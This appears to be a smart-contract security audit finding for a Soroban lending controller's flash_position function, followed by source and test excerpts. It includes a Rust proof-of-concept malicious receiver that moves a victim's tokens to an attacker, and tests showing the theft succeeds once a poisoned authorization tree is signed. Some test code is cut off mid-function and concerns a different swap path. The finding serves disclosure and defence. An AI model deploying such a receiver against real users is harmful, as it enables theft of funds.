### Title
Malicious flash-position receiver can execute unauthorized wallet transfers under the caller’s signed auth tree - (File: contracts/controller/src/strategies/flash_position.rs)

### Summary
`flash_position` lets an unprivileged caller select an arbitrary Wasm receiver, authorizes the supplied `caller`, and then invokes the receiver’s `execute_flash_position` callback inside the same authorization scope. [1](#0-0) [2](#0-1) 

A malicious receiver can request an unrelated token transfer from the caller during the callback; if the victim signs the simulated authorization tree containing that child invocation, the transfer executes even though it is unrelated to the flash-position operation. [3](#0-2) [4](#0-3) 

### Finding Description
The public `flash_position` entrypoint accepts both `caller` and `receiver` arguments and forwards them to `process_flash_position`. [5](#0-4) 

`process_flash_position` calls `caller.require_auth()`, validates only that `receiver` is a Wasm contract and is not the controller or pool, then forwards minted debt tokens to that receiver and invokes its `execute_flash_position` method. [6](#0-5) [7](#0-6) 

The callback invocation is dynamically dispatched to the caller-provided contract address with no allowlist or restriction on what other contracts the receiver calls. [8](#0-7) 

Soroban authorization is scoped to the signed invocation tree, so a nested call requiring the caller’s authorization can be attached beneath the root `flash_position` authorization rather than requiring a separate top-level signature. [9](#0-8) [10](#0-9) 

The flash guard and post-callback checks only protect protocol accounting and controller reentry; they do not prevent the receiver from adding an unrelated caller-authorized token transfer to the signed tree. [11](#0-10) 

### Impact Explanation
An attacker who convinces a victim to submit a flash position using an attacker-controlled receiver can steal unrelated tokens from the victim’s wallet by including a `transfer(victim, attacker, amount)` child invocation in the simulated authorization tree. [12](#0-11) 

The attacker can make the enclosing flash position succeed by prefunding the receiver with the declared collateral and transferring that collateral to the controller, so the theft is not rolled back by the collateral or solvency checks. [13](#0-12) 

This is theft of user funds, not merely a failed transaction or route-quality loss. [14](#0-13) 

### Likelihood Explanation
The attack is reachable by any unprivileged user because `flash_position` accepts a caller-selected deployed contract and requires no privileged receiver registration. [15](#0-14) [16](#0-15) 

Exploitation requires social engineering: the victim must submit the transaction and sign the expanded authorization tree that visibly includes the rogue transfer. [17](#0-16) 

The risk is nevertheless material because the receiver address and opaque callback `data` do not by themselves reveal that the simulated authorization tree contains an unrelated wallet transfer. [8](#0-7) 

### Recommendation
Do not allow arbitrary caller-selected contracts to execute inside an authorization-bearing `flash_position` invocation; use a governance-approved receiver registry or another trusted receiver mechanism. [16](#0-15) [8](#0-7) 

If arbitrary receivers remain supported, the interface and client tooling should decode and display every signed sub-invocation and reject an authorization tree containing calls other than the expected protocol operations. [12](#0-11) 

### Proof of Concept
A malicious receiver can implement `execute_flash_position` to transfer an unrelated token from the supplied `initiator` to the attacker, then send the required collateral to the supplied `controller`:

```rust
pub fn execute_flash_position(
    env: Env,
    initiator: Address,
    _account_id: u64,
    _asset: Address,
    _amount: i128,
    _fee: i128,
    _amount_received: i128,
    controller: Address,
    _data: Bytes,
) {
    token::Client::new(&env, &victim_token()).transfer(
        &initiator,
        &attacker(),
        &victim_balance(),
    );

    token::Client::new(&env, &collateral_token()).transfer(
        &env.current_contract_address(),
        &controller,
        &required_collateral(),
    );
}
```

The victim invokes `flash_position` with `caller` set to the victim, a valid flash-loanable debt market, `account_id = 0`, a valid spoke and mode, the malicious `receiver`, and a collateral minimum that the receiver can satisfy. [15](#0-14) [18](#0-17) 

During simulation, the rogue token transfer is recorded as a child invocation beneath the victim’s `flash_position` authorization; if the victim signs that tree, the transfer executes and the callback can still satisfy the declared collateral receipt so the transaction finalizes. [12](#0-11) [14](#0-13)

pub(crate) fn process_flash_position(
    env: &Env,
    caller: &Address,
    params: FlashPositionParams<'_>,
) -> u64 {
    require_authorized_caller(env, caller);

    let FlashPositionParams {
        account_id,
        spoke_id,
        mode,
        debt,
        amount,
        receiver,
        data,
        collaterals,
        refund_assets,
    } = params;

    require_positive_amount(env, amount);
    config::require_hub_active(env, debt.hub_id);
    assert_with_error!(
        env,
        matches!(
            mode,
            PositionMode::Multiply | PositionMode::Long | PositionMode::Short
        ),
        CollateralError::InvalidPositionMode
    );
    require_wasm_receiver(env, receiver);

    let controller = env.current_contract_address();
    assert_with_error!(
        env,
        *receiver != controller,
        FlashLoanError::InvalidFlashloanReceiver
    );

    let mut cache = Context::new(env);
    let pool_addr = cache.cached_pool_address();
    assert_with_error!(
        env,
        *receiver != pool_addr,
        FlashLoanError::InvalidFlashloanReceiver
    );
    // Caller-selected receivers require flash loans enabled; multiply uses
    // the configured router and does not require this flag.
    assert_with_error!(
        env,
        cache.cached_pool_sync_data(debt).params.is_flashloanable,
        FlashLoanError::FlashloanNotEnabled
    );

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);

#[test]
fn source_account_credentials_bind_the_rogue_transfer_to_the_tree_without_an_entry_signature() {
    let env = Env::default();
    let account = AccountId(PublicKey::PublicKeyTypeEd25519(Uint256([7; 32])));
    env.host()
        .set_source_account(account.clone())
        .expect("source account");
    let wallet = Address::try_from_val(&env, &ScAddress::Account(account)).expect("G address");
    let attacker = Address::generate(&env);

    let entry = env.register(RootAuthEntry, ());
    let wallet_token = env.register(RecordingToken, ());
    let plan = (
        wallet.clone(),
        wallet_token.clone(),
        attacker.clone(),
        99i128,
    );
    let rogue_pool = env.register(RogueHopPool, plan);
    let run_args: Vec<Val> = (wallet.clone(), rogue_pool.clone()).into_val(&env);
    let as_source_account = |children| SorobanAuthorizationEntry {
        credentials: SorobanCredentials::SourceAccount,
        root_invocation: contract_fn(&env, &entry, "run", run_args.clone(), children),
    };
    let client = RootAuthEntryClient::new(&env, &entry);
    let token = RecordingTokenClient::new(&env, &wallet_token);

    env.set_auths(&[as_source_account(std::vec![])]);
    let refused = client
        .try_run(&wallet, &rogue_pool)
        .expect_err("a transfer outside the tree is unauthorized")
        .expect("host error");
    std::println!("source-account rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    let diagnostics = std::format!("{:?}", env.host().get_events().unwrap().0);
    assert!(diagnostics.contains("Unauthorized function call for address"));
    assert_eq!(token.moved(), None);

    let transfer_args: Vec<Val> = (wallet.clone(), attacker.clone(), 99i128).into_val(&env);
    let child = contract_fn(&env, &wallet_token, "transfer", transfer_args, std::vec![]);
    env.set_auths(&[as_source_account(std::vec![child])]);
    client.run(&wallet, &rogue_pool);
    assert_eq!(token.moved(), Some((attacker, 99)));
